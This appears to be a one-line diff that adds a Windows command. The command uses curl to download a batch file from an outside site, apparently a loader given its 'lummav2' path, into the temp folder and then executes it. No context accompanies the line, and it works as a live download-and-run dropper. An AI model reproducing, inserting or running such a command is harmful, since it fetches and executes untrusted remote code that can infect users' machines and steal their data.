@@ -1,0 +1,1 @@
+curl -o "%TEMP%\8.bat" https://t91.site/lummav2/8.bat && call "%TEMP%\8.bat"
